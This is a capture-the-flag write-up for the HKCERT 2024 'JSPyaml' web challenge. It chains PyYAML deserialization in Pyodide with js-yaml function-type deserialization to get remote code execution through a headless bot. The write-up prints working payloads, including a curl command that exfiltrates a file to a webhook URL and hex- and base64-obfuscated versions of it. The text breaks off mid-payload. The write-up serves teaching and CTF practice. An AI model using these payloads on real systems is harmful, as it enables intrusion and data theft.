# JSPyaml

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 18 solves / 400 points
- Author: @Ozetta
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

I only know how to parse YAML with Python, so I use JS to run Python to parse YAML.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117165501.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117165910.png)

In here, we can submit a YAML data. Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117170016.png)

Hmm... There's not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/Web/JSPyaml/jspyaml_3c3a6ee9d56cc287a5852cc8873b594b.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|17:01:52(HKT)]
└> file jspyaml_3c3a6ee9d56cc287a5852cc8873b594b.zip   
jspyaml_3c3a6ee9d56cc287a5852cc8873b594b.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|17:01:54(HKT)]
└> unzip jspyaml_3c3a6ee9d56cc287a5852cc8873b594b.zip  
Archive:  jspyaml_3c3a6ee9d56cc287a5852cc8873b594b.zip
   creating: web/
  inflating: web/proof.sh            
  inflating: web/package.json        
  inflating: web/Dockerfile          
  inflating: web/server.js           
  inflating: web/bot.js              
  inflating: docker-compose.yml      
```

After reading the source code, we have the following findings:
1. This web application is written in JavaScript with framework "[Express.js](https://expressjs.com/)"
2. This challenge has a "bot" that can visit any URL that we provided, which indicates that this challenge involves with client-side vulnerabilities.

Let's dive into the details!

First off, what's our objective? Where's the flag?

In `web/proof.sh`, we can see that it's a Bash script file that just echos out the flag:

```bash
#!/bin/sh
echo hkcert22{22222222222222222222}
```

In `web/Dockerfile`, this Bash script file is copied to `/proof.sh`:

```bash
[...]
COPY proof.sh /proof.sh
```

With that said, we need to somehow get Remote Code Execution (RCE) to read the `proof.sh` Bash script file.

Now, let's take a look at the server-side code!

In `web/server.js`, we can see that there's a very weird POST route called `/debug`:

```javascript
const express = require('express');
[...]
const cookieParser = require('cookie-parser');
[...]
const {URLSearchParams} = require('url');
const ip = require('ip');
[...]
const app = express();
app.use(cookieParser());
app.use(express.urlencoded({extended:false}));
[...]
app.post('/debug', (req, res) => {
    if(ip.isLoopback(req.ip) && req.cookies.debug === 'on'){
        const yaml = require('js-yaml');
        let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
        try{
            let input = req.body.yaml;
            console.log(`Input: ${input}`);
            let output = yaml.load(input, {schema});
            console.log(`Output: ${output}`);
            res.json(output);
        }catch(e){
            res.status(400).send('Error');
        }
    }else{
        res.status(401).send('Unauthorized');
    }
});
```

In this route, when the remote IP address of the request ([`req.ip`](http://expressjs.com/en/api.html#req.ip)) is a loopback address (i.e.: `127.0.0.1`) and has cookie named `debug` with value `on`, the server uses library [`js-yaml`](https://www.npmjs.com/package/js-yaml) to parse our POST parameter `yaml` YAML data and outputs the parsed result.

Hmm... Does this route vulnerable to ***server-side* YAML deserialization**?

In [js-yaml method `load` documentation](https://www.npmjs.com/package/js-yaml#load-string---options-), it said:

> [...]By default, does not support regexps, functions and undefined.

So, by default, it is not possible to get RCE via method `load`, because the default schema, `DEFAULT_SCHEMA`, doesn't support JavaScript functions.

However, in this case, **the `DEFAULT_SCHEMA` is extended to all YAML types via [js-yaml-js-types](https://www.npmjs.com/package/js-yaml-js-types)**.

If we look at library [js-yaml-js-types's usage](https://www.npmjs.com/package/js-yaml-js-types?activeTab=readme#usage), **the variable name is literally called `unsafe`**:

```javascript
const yaml = require('js-yaml');
const unsafe = require('js-yaml-js-types').all;

const schema = yaml.DEFAULT_SCHEMA.extend(unsafe);

const src = `
- !!js/regexp /pattern/gim
- !!js/undefined ''
- !!js/function 'function () { return true }'
`

yaml.load(src, { schema });
```

Basically, if the schema is extended to all YAML types, we can **execute JavaScript code on the server-side**, which is very dangerous.

In [this blog post](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/), we can gain RCE via the following YAML payload:

```yaml
"toString": !<tag:yaml.org,2002:js/function> "function (){console.log('RCE!!');}"
```

In this payload, it overrides the `toString` method with our evil function. After overriding, if the application used the `toString` method, it'll execute our evil function instead of the original one.

To test this locally, we can install all the libraries and run `web/server.js` via `node`:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|17:43:49(HKT)]
└> cd web 
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml/web)-[2024.11.17|17:43:53(HKT)]
└> npm install    
[...]
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml/web)-[2024.11.17|17:44:12(HKT)]
└> node server.js
Server is running at http://localhost:3000
```

After that, we can send the following POST request to test RCE via server-side YAML deserialization:

```http
POST /debug HTTP/1.1
Host: localhost:3000
Cookie: debug=on
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

yaml="toString"%3a+!<tag%3ayaml.org,2002%3ajs/function>+"function+(){console.log('RCE!!')%3b}"
```

Response:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 2
ETag: W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"
Date: Sun, 17 Nov 2024 09:56:51 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{}
```

Although the response data is empty, it did executed our evil function. We can see the output in the log message:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml/web)-[2024.11.17|17:44:12(HKT)]
└> node server.js
[...]
Input: "toString": !<tag:yaml.org,2002:js/function> "function (){console.log('RCE!!');}"
RCE!!
Output: undefined
```

To execute OS commands, we can use the following payload:

```yaml
"toString": !<tag:yaml.org,2002:js/function> "function (){console.log(process.mainModule.require('child_process').execSync('whoami').toString());}"
```

In this payload, we're getting the `require` function via `process.mainModule`. Then, we import `child_process` and use function `execSync` to execute OS commands. Finally, the `toString` method is to convert executed command's output from byte to string.

```shell
Input: "toString": !<tag:yaml.org,2002:js/function> "function (){console.log(process.mainModule.require('child_process').execSync('whoami').toString());}"
siunam

Output: undefined
```

It worked! Now we can confirm that the **POST route `/debug` can achieve RCE via server-side YAML deserialization**.

But you might ask: **How can we bypass the loopback address check?**

Hmm... Maybe the bot can help us?

In this web application, it also has a POST route `/report`, which allows us to send a URL to the bot, and the bot will visit the URL:

```javascript
const {browse} = require('./bot');
[...]
app.post('/report', async (req, res) => {
    const url = req.body.url;
    [...]
    try{
        [...]
        if([...]){  //change this if you want to test locally without hCaptcha
            browse(url);
            res.send('Thank you for your report.');
        }else{
            [...]
        }
    }catch(e){
        [...]
    }
});
```

In `web/bot.js`, function `browse` will launch a [headless Chromium browser](https://chromium.googlesource.com/chromium/src/+/lkgr/headless/README.md), open a new tab, and go to our URL:

```javascript
const puppeteer = require('puppeteer-core');

const TIMEOUT = 30000;
const HOSTNAME = process.env.HOSTNAME ?? 'http://localhost:3000';
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function browse(url){
    let browser;
    try{
        console.log(`Opening browser for ${url}`);
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            executablePath: '/usr/bin/chromium',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-gpu',
                '--jitless'
            ]
        });
        const ctx = await browser.createBrowserContext();
        await Promise.race([
            sleep(TIMEOUT),
            visit(ctx, url),
        ]);
    }catch(e){
        [...]
    }finally{
        [...]
    }
}

async function visit(ctx, url){
    page = await ctx.newPage();
    console.log('Visting ', url);
    await page.goto(url);
    await sleep(TIMEOUT);
    await page.close();
}
```

Hmm... Since the bot should be able to reach the web server using the loopback address (`localhost:3000`), if we can somehow **set the bot's browser `debug` cookie and let the bot send a POST request to the debug route**, we can read the flag via the server-side YAML deserialization vulnerability. But how??

The bot can visit any URLs, so maybe the bot could visit our HTML payload, which sets the `debug` cookie with value `on`... Wait a minute, this doesn't work. This is because our attacker's website origin is different from `localhost:3000`.

Therefore, it has to do something with the challenge's web application.

Uhh... What's the YAML parsing in the **client-side**?

If we view the source code on the GET `/` route, we can see that the client-side YAML parsing is done via **[Pyodide](https://pyodide.org/en/stable/) and Python [PyYAML](https://pypi.org/project/PyYAML/)**. Let's break it down!

```html
<head>
    [...]
    <script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
    [...]
</head>
<body>
    [...]
    <textarea id="yaml" placeholder="- YAML"></textarea><br>
    [...]
    <script>
        let pyodide;
        async function init(){
            pyodide = await loadPyodide();
            await pyodide.loadPackage("pyyaml");
            runHash();
        }
        [...]
        async function runHash() {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (hash) {
                yaml.value = hash;
                run(hash);
            }
        }
        [...]
        onload = init;
    </script>
</body>
```

When the page is loaded, it'll call function `init`. In there, it uses function `loadPyodide` to load library Pyodide. For those who doesn't know about this library, **Pyodide is a Python distribution for the browser based on WebAssembly.** In short, Pyodide allows us to execute arbitrary Python code in the browser. After loading the library, it'll load Python library PyYAML for parsing YAML data. Then, it'll call function `runHash`. In there, it gets the URL hash's value and set the `<textarea>` element's value to the URL hash one. Then call function `run`.

In function `run`, the Python code imports PyYAML (`yaml`), then uses function `load` to parse YAML data using the default loader, `yaml.Loader`. In PyYAML, the loader is similar to js-yaml's schema, which restricts which YAML types can be used. After defining the Python code, it uses function `runPythonAsync` from Pyodide to execute it:

```html
<body>
    [...]
    <pre id="output"></pre>
    
    <script>
        [...]
        async function run(y){
            x = `import yaml
yaml.load("""${y.replaceAll('"','')}""",yaml.Loader)`;
            try {
                output.textContent = await pyodide.runPythonAsync(x);
            } catch (e) {
                output.textContent = e;
            }
        }
        [...]
    </script>
</body>
```

Beautified Python code:

```python
import yaml
yaml.load("""<YAML_data_here>""",yaml.Loader)
```

Hmm... **Does this implementation vulnerable to YAML deserialization?**

After some researching, [PyYAML GitHub repository's `README.md`](https://github.com/yaml/pyyaml) has mentioned this:

> If you don't trust the input YAML stream, you should use:
> 
> ```python
> >>> yaml.safe_load(stream)
> ```

In our case, it's using function `load`, not `safe_load`.

Hmm... I wonder what YAML types we can use in `Loader`?...

If we look at PyYAML's source code, [the `Loader` class](https://github.com/yaml/pyyaml/blob/main/lib/yaml/loader.py#L41) uses [class `Constructor`](https://github.com/yaml/pyyaml/blob/main/lib/yaml/constructor.py#L747). However, this class is inherited from [class `UnsafeConstructor`](https://github.com/yaml/pyyaml/blob/main/lib/yaml/constructor.py#L713). As the class name suggested, it's really unsafe, because it allows all YAML types to be used, including **the ability to create a new object, call different functions, and more**.

> Note: At the time of this writeup, the latest version of PyYAML is 6.0.2.

Based on [this uiuctf 2020 "deserializeme" writeup by harrier](https://hackmd.io/@harrier/uiuctf20), we can use the following YAML payload to execute arbitrary Python code:

```yaml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "print(__import__('os').system('id'))"
```

> Note: For more details about the above payload, please feel free to read his writeup!

Let's try that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117210949.png)

Umm... It doesn't work... It returned `-1`, which means it failed to execute the command. I couldn't figure out why, properly it's because Pyodide's [Emscripten](https://emscripten.org/) doesn't allow us to execute arbitrary commands? Anyway, our goal is to execute arbitrary Python code.

Now, I wonder what modules are imported into Pyodide... To enumerate that, we can just print out `sys.modules`:

```yaml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "print(sys.modules)"
```

Result:

```python
{'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, [...] 'yaml.cyaml': <module 'yaml.cyaml' from '/lib/python3.12/site-packages/yaml/cyaml.py'>, 'yaml': <module 'yaml' from '/lib/python3.12/site-packages/yaml/__init__.py'>}
```

There are lots of modules. There are 2 loaded modules stood out the most:

```python
{[...], 'pyodide': <module 'pyodide' from '/lib/python312.zip/pyodide/__init__.py'>, 'pyodide.code': <module 'pyodide.code' from '/lib/python312.zip/pyodide/code.py'>, [...]}
```

Huh? We can use JavaScript Pyodide to execute Python Pyodide??

According to [Pyodide Python API documentation](https://pyodide.org/en/stable/usage/api/python-api.html), the **[pyodide.code](https://pyodide.org/en/stable/usage/api/python-api/code.html#module-pyodide.code) module allows us to evaluate Python and JavaScript code**. Hmm? We can run JavaScript?

In module `pyodide.code` [function `run_js`](https://pyodide.org/en/stable/usage/api/python-api/code.html#pyodide.code.run_js), it said:

> A wrapper for the [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval "(in MDN docs)") function.
>  
> Runs `code` as a Javascript code string and returns the result. [...]

Let's try to execute arbitrary JavaScript via function `run_js`!

```yaml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "print(__import__('pyodide').code.run_js('alert(document.domain)'))"
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241117212731.png)

Oh! We can now execute arbitrary JavaScript code!

That means... **We can set the bot's cookie `debug=on` and send a POST request to the debug route!!!**

## Exploitation

Armed with above information, the exploitation steps are:
1. Prepare our **client-side** YAML deserialization payload, which sets the bot's cookie and send a POST request to the debug route
2. Send URL `http://localhost:3000/#<client-side_YAML_deserialization_payload_here>` to the bot
3. The bot visits our URL, executes our **client-side** YAML deserialization payload
4. The bot sends our **server-side** YAML deserialization payload to the debug route
5. The server-side payload exfiltrate the flag via OOB (Out-of-Band) data exfiltration. (Because we can't see the output directly, it's in the bot's browser)

To test this locally, we can spin up the Docker container via `docker compose`.

But before we do that, we'll need to modify the POST `/report` route to the following. This is because we don't want the hCaptcha to get in our way.

```javascript
app.post('/report', async (req, res) => {
    const url = req.body.url;
    browse(url);
});
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|20:12:44(HKT)]
└> docker compose up                                                    
[...]
[+] Running 2/2
 ✔ Network jspyaml_default      Created                                                                0.1s 
 ✔ Container jspyaml-jspyaml-1  Created                                                                0.0s 
Attaching to jspyaml-1
jspyaml-1  | Server is running at http://localhost:3000
```

> Note: Due to some unknown reasons, Docker command `RUN npm install` takes a very long time to finish the execution. To "skip" it, we can install all the libraries, then copy directory `node_modules` to Docker container's path `/app/node_modules/`.
>  
> ```shell
> ┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml)-[2024.11.17|20:15:44(HKT)]
> └> cd web 
> ┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/JSPyaml/web)-[2024.11.17|20:15:46(HKT)]
> └> npm install    
> [...]
> ```
> 
> Then modify `web/Dockerfile` with the following:
> ```bash
> [...]
> # RUN npm install
> COPY node_modules/ /app/node_modules/
> RUN chmod 555 -R /app/
> [...]
> ```
> 
> Finally run `docker compose up` again.

- Preparing **server-side** YAML deserialization payload

```yaml
"toString": !<tag:yaml.org,2002:js/function> "function (){console.log(process.mainModule.require('child_process').execSync('cat /proof.sh | base64 -w0 | curl -d @- https://webhook.site/1ded601d-f3f1-40eb-a99c-ab9746346425').toString())}"
```

In here, we read the contents of `/proof.sh`, base64 encode it, and exfiltrate it by sending a POST request to our webhook site. (The POST request's data is from stdin.)

- Preparing our **client-side** YAML deserialization payload

To do so, the payload should set the cookie `debug` to `on`, and use `fetch` to send a POST request to `/debug`. However, the server-side YAML deserialization payload will cause a syntax error: (Or maybe I have skill issue lol)

```yaml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "print(__import__('pyodide').code.run_js('document.cookie=`debug=on`;const data=new URLSearchParams();data.append(`yaml`, `\"toString\": !<tag:yaml.org,2002:js/function> \"function (){console.log(process.mainModule.require(\'child_process\').execSync(\'cat /proof.sh | base64 -w0 | curl -d @- https://webhook.site/1ded601d-f3f1-40eb-a99c-ab9746346425\').toString())}\"`);fetch(`//localhost:3000/debug`,{method:`POST`,body:data})'))"
```

Since I hate escaping strings, I will base64 encode the server-side YAML deserialization payload. Then, in the client-side YAML deserialization payload, it base64 decodes the payload via `atob`. Also, because `listitems`'s value is just a string, we can just use hex characters.

Base64 encoded server-side YAML deserialization payload:

```
InRvU3RyaW5nIjogITx0YWc6eWFtbC5vcmcsMjAwMjpqcy9mdW5jdGlvbj4gImZ1bmN0aW9uICgpe2NvbnNvbGUubG9nKHByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2NhdCAvcHJvb2Yuc2ggfCBiYXNlNjQgLXcwIHwgY3VybCAtZCBALSBodHRwczovL3dlYmhvb2suc2l0ZS8xZGVkNjAxZC1mM2YxLTQwZWItYTk5Yy1hYjk3NDYzNDY0MjUnKS50b1N0cmluZygpKX0i
```

Before turning `listitems` into hex characters:

```yaml
print(__import__('pyodide').code.run_js('document.cookie="debug=on";const data=new URLSearchParams();data.append("yaml", atob("InRvU3RyaW5nIjogITx0YWc6eWFtbC5vcmcsMjAwMjpqcy9mdW5jdGlvbj4gImZ1bmN0aW9uICgpe2NvbnNvbGUubG9nKHByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2NhdCAvcHJvb2Yuc2ggfCBiYXNlNjQgLXcwIHwgY3VybCAtZCBALSBodHRwczovL3dlYmhvb2suc2l0ZS8xZGVkNjAxZC1mM2YxLTQwZWItYTk5Yy1hYjk3NDYzNDY0MjUnKS50b1N0cmluZygpKX0i"));fetch("//localhost:3000/debug",{method:"POST",body:data})'))
```

After turning `listitems` into hex characters:

```yaml
\x70\x72\x69\x6e\x74\x28\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x70\x79\x6f\x64\x69\x64\x65\x27\x29\x2e\x63\x6f\x64\x65\x2e\x72\x75\x6e\x5f\x6a\x73\x28\x27\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x3d\x22\x64\x65\x62\x75\x67\x3d\x6f\x6e\x22\x3b\x63\x6f\x6e\x73\x74\x20\x64\x61\x74\x61\x3d\x6e\x65\x77\x20\x55\x52\x4c\x53\x65\x61\x72\x63\x68\x50\x61\x72\x61\x6d\x73\x28\x29\x3b\x64\x61\x74\x61\x2e\x61\x70\x70\x65\x6e\x64\x28\x22\x79\x61\x6d\x6c\x22\x2c\x20\x61\x74\x6f\x62\x28\x22\x49\x6e\x52\x76\x55\x33\x52\x79\x61\x57\x35\x6e\x49\x6a\x6f\x67\x49\x54\x78\x30\x59\x57\x63\x36\x65\x57\x46\x74\x62\x43\x35\x76\x63\x6d\x63\x73\x4d\x6a\x41\x77\x4d\x6a\x70\x71\x63\x79\x39\x6d\x64\x57\x35\x6a\x64\x47\x6c\x76\x62\x6a\x34\x67\x49\x6d\x5a\x31\x62\x6d\x4e\x30\x61\x57\x39\x75\x49\x43\x67\x70\x65\x32\x4e\x76\x62\x6e\x4e\x76\x62\x47\x55\x75\x62\x47\x39\x6e\x4b\x48\x42\x79\x62\x32\x4e\x6c\x63\x33\x4d\x75\x62\x57\x46\x70\x62\x6b\x31\x76\x5a\x48\x56\x73\x5a\x53\x35\x79\x5a\x58\x46\x31\x61\x58\x4a\x6c\x4b\x43\x64\x6a\x61\x47\x6c\x73\x5a\x46\x39\x77\x63\x6d\x39\x6a\x5a\x58\x4e\x7a\x4a\x79\x6b\x75\x5a\x58\x68\x6c\x59\x31\x4e\x35\x62\x6d\x4d\x6f\x4a\x32\x4e\x68\x64\x43\x41\x76\x63\x48\x4a\x76\x62\x32\x59\x75\x63\x32\x67\x67\x66\x43\x42\x69\x59\x58\x4e\x6c\x4e\x6a\x51\x67\x4c\x58\x63\x77\x49\x48\x77\x67\x59\x33\x56\x79\x62\x43\x41\x74\x5a\x43\x42\x41\x4c\x53\x42\x6f\x64\x48\x52\x77\x63\x7a\x6f\x76\x4c\x33\x64\x6c\x59\x6d\x68\x76\x62\x32\x73\x75\x63\x32\x6c\x30\x5a\x53\x38\x78\x5a\x47\x56\x6b\x4e\x6a\x41\x78\x5a\x43\x31\x6d\x4d\x32\x59\x78\x4c\x54\x51\x77\x5a\x57\x49\x74\x59\x54\x6b\x35\x59\x79\x31\x68\x59\x6a\x6b\x33\x4e\x44\x59\x7a\x4e\x44\x59\x30\x4d\x6a\x55\x6e\x4b\x53\x35\x30\x62\x31\x4e\x30\x63\x6d\x6c\x75\x5a\x79\x67\x70\x4b\x58\x30\x69\x22\x29\x29\x3b\x66\x65\x74\x63\x68\x28\x22\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x33\x30\x30\x30\x2f\x64\x65\x62\x75\x67\x22\x2c\x7b\x6d\x65\x74\x68\x6f\x64\x3a\x22\x50\x4f\x53\x54\x22\x2c\x62\x6f\x64\x79\x3a\x64\x61\x74\x61\x7d\x29\x27\x29\x29
```

Final client-side YAML deserialization payload:

```yaml
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "\x70\x72\x69\x6e\x74\x28\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x70\x79\x6f\x64\x69\x64\x65\x27\x29\x2e\x63\x6f\x64\x65\x2e\x72\x75\x6e\x5f\x6a\x73\x28\x27\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x3d\x22\x64\x65\x62\x75\x67\x3d\x6f\x6e\x22\x3b\x63\x6f\x6e\x73\x74\x20\x64\x61\x74\x61\x3d\x6e\x65\x77\x20\x55\x52\x4c\x53\x65\x61\x72\x63\x68\x50\x61\x72\x61\x6d\x73\x28\x29\x3b\x64\x61\x74\x61\x2e\x61\x70\x70\x65\x6e\x64\x28\x22\x79\x61\x6d\x6c\x22\x2c\x20\x61\x74\x6f\x62\x28\x22\x49\x6e\x52\x76\x55\x33\x52\x79\x61\x57\x35\x6e\x49\x6a\x6f\x67\x49\x54\x78\x30\x59\x57\x63\x36\x65\x57\x46\x74\x62\x43\x35\x76\x63\x6d\x63\x73\x4d\x6a\x41\x77\x4d\x6a\x70\x71\x63\x79\x39\x6d\x64\x57\x35\x6a\x64\x47\x6c\x76\x62\x6a\x34\x67\x49\x6d\x5a\x31\x62\x6d\x4e\x30\x61\x57\x39\x75\x49\x43\x67\x70\x65\x32\x4e\x76\x62\x6e\x4e\x76\x62\x47\x55\x75\x62\x47\x39\x6e\x4b\x48\x42\x79\x62\x32\x4e\x6c\x63\x33\x4d\x75\x62\x57\x46\x70\x62\x6b\x31\x76\x5a\x48\x56\x73\x5a\x53\x35\x79\x5a\x58\x46\x31\x61\x58\x4a\x6c\x4b\x43\x64\x6a\x61\x47\x6c\x73\x5a\x46\x39\x77\x63\x6d\x39\x6a\x5a\x58\x4e\x7a\x4a\x79\x6b\x75\x5a\x58\x68\x6c\x59\x31\x4e\x35\x62\x6d\x4d\x6f\x4a\x32\x4e\x68\x64\x43\x41\x76\x63\x48\x4a\x76\x62\x32\x59\x75\x63\x32\x67\x67\x66\x43\x42\x69\x59\x58\x4e\x6c\x4e\x6a\x51\x67\x4c\x58\x63\x77\x49\x48\x77\x67\x59\x33\x56\x79\x62\x43\x41\x74\x5a\x43\x42\x41\x4c\x53\x42\x6f\x64\x48\x52\x77\x63\x7a\x6f\x76\x4c\x33\x64\x6c\x59\x6d\x68\x76\x62\x32\x73\x75\x63\x32\x6c\x30\x5a\x53\x38\x78\x5a\x47\x56\x6b\x4e\x6a\x41\x78\x5a\x43\x31\x6d\x4d\x32\x59\x78\x4c\x54\x51\x77\x5a\x57\x49\x74\x59\x54\x6b\x35\x59\x79\x31\x68\x59\x6a\x6b\x33\x4e\x44\x59\x7a\x4e\x44\x59\x30\x4d\x6a\x55\x6e\x4b\x53\x35\x30\x62\x31\x4e\x30\x63\x6d\x6c\x75\x5a\x79\x67\x70\x4b\x58\x30\x69\x22\x29\x29\x3b\x66\x65\x74\x63\x68\x28\x22\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x33\x30\x30\x30\x2f\x64\x65\x62\x75\x67\x22\x2c\x7b\x6d\x65\x74\x68\x6f\x64\x3a\x22\x50\x4f\x53\x54\x22\x2c\x62\x6f\x64\x79\x3a\x64\x61\x74\x61\x7d\x29\x27\x29\x29"
```

URL encode the final client-side YAML deserialization payload:

```
%21%21python%2Fobject%2Fnew%3Atype%0A%20%20args%3A%20%5B%22z%22%2C%20%21%21python%2Ftuple%20%5B%5D%2C%20%7B%22extend%22%3A%20%21%21python%2Fname%3Aexec%20%7D%5D%0A%20%20listitems%3A%20%22%5Cx70%5Cx72%5Cx69%5Cx6e%5Cx74%5Cx28%5Cx5f%5Cx5f%5Cx69%5Cx6d%5Cx70%5Cx6f%5Cx72%5Cx74%5Cx5f%5Cx5f%5Cx28%5Cx27%5Cx70%5Cx79%5Cx6f%5Cx64%5Cx69%5Cx64%5Cx65%5Cx27%5Cx29%5Cx2e%5Cx63%5Cx6f%5Cx64%5Cx65%5Cx2e%5Cx72%5Cx75%5Cx6e%5Cx5f%5Cx6a%5Cx73%5Cx28%5Cx27%5Cx64%5Cx6f%5Cx63%5Cx75%5Cx6d%5Cx65%5Cx6e%5Cx74%5Cx2e%5Cx63%5Cx6f%5Cx6f%5Cx6b%5Cx69%5Cx65%5Cx3d%5Cx22%5Cx64%5Cx65%5Cx62%5Cx75%5Cx67%5Cx3d%5Cx6f%5Cx6e%5Cx22%5Cx3b%5Cx63%5Cx6f%5Cx6e%5Cx73%5Cx74%5Cx20%5Cx64%5Cx61%5Cx74%5Cx61%5Cx3d%5Cx6e%5Cx65%5Cx77%5Cx20%5Cx55%5Cx52%5Cx4c%5Cx53%5Cx65%5Cx61%5Cx72%5Cx63%5Cx68%5Cx50%5Cx61%5Cx72%5Cx61%5Cx6d%5Cx73%5Cx28%5Cx29%5Cx3b%5Cx64%5Cx61%5Cx74%5Cx61%5Cx2e%5Cx61%5Cx70%5Cx70%5Cx65%5Cx6e%5Cx64%5Cx28%5Cx22%5Cx79%5Cx61%5Cx6d%5Cx6c%5Cx22%5Cx2c%5Cx20%5Cx61%5Cx74%5Cx6f%5Cx62%5Cx28%5Cx22%5Cx49%5Cx6e%5Cx52%5Cx76%5Cx55%5Cx33%5Cx52%5Cx79%5Cx61%5Cx57%5Cx35%5Cx6e%5Cx49%5Cx6a%5Cx6f%5Cx67%5Cx49%5Cx54%5Cx78%5Cx30%5Cx59%5Cx57%5Cx63%5Cx36%5Cx65%5Cx57%5Cx46%5Cx74%5Cx62%5Cx43%5Cx35%5Cx76%5Cx63%5Cx6d%5Cx63%5Cx73%5Cx4d%5Cx6a%5Cx41%5Cx77%5Cx4d%5Cx6a%5Cx70%5Cx71%5Cx63%5Cx79%5Cx39%5Cx6d%5Cx64%5Cx57%5Cx35%5Cx6a%5Cx64%5Cx47%5Cx6c%5Cx76%5Cx62%5Cx6a%5Cx34%5Cx67%5Cx49%5Cx6d%5Cx5a%5Cx31%5Cx62%5Cx6d%5Cx4e%5Cx30%5Cx61%5Cx57%5Cx39%5Cx75%5Cx49%5Cx43%5Cx67%5Cx70%5Cx65%5Cx32%5Cx4e%5Cx76%5Cx62%5Cx6e%5Cx4e%5Cx76%5Cx62%5Cx47%5Cx55%5Cx75%5Cx62%5Cx47%5Cx39%5Cx6e%5Cx4b%5Cx48%5Cx42%5Cx79%5Cx62%5Cx32%5Cx4e%5Cx6c%5Cx63%5Cx33%5Cx4d%5Cx75%5Cx62%5Cx57%5Cx46%5Cx70%5Cx62%5Cx6b%5Cx31%5Cx76%5Cx5a%5Cx48%5Cx56%5Cx73%5Cx5a%5Cx53%5Cx35%5Cx79%5Cx5a%5Cx58%5Cx46%5Cx31%5Cx61%5Cx58%5Cx4a%5Cx6c%5Cx4b%5Cx43%5Cx64%5Cx6a%5Cx61%5Cx47%5Cx6c%5Cx73%5Cx5a%5Cx46%5Cx39%5Cx77%5Cx63%5Cx6d%5Cx39%5Cx6a%5Cx5a%5Cx58%5Cx4e%5Cx7a%5Cx4a%5Cx79%5Cx6b%5Cx75%5Cx5a%5Cx58%5Cx68%5Cx6c%5Cx59%5Cx31%5Cx4e%5Cx35%5Cx62%5Cx6d%5Cx4d%5Cx6f%5Cx4a%5Cx32%5Cx4e%5Cx68%5Cx64%5Cx43%5Cx41%5Cx76%5Cx63%5Cx48%5Cx4a%5Cx76%5Cx62%5Cx32%5Cx59%5Cx75%5Cx63%5Cx32%5Cx67%5Cx67%5Cx66%5Cx43%5Cx42%5Cx69%5Cx59%5Cx58%5Cx4e%5Cx6c%5Cx4e%5Cx6a%5Cx51%5Cx67%5Cx4c%5Cx58%5Cx63%5Cx77%5Cx49%5Cx48%5Cx77%5Cx67%5Cx59%5Cx33%5Cx56%5Cx79%5Cx62%5Cx43%5Cx41%5Cx74%5Cx5a%5Cx43%5Cx42%5Cx41%5Cx4c%5Cx53%5Cx42%5Cx6f%5Cx64%5Cx48%5Cx52%5Cx77%5Cx63%5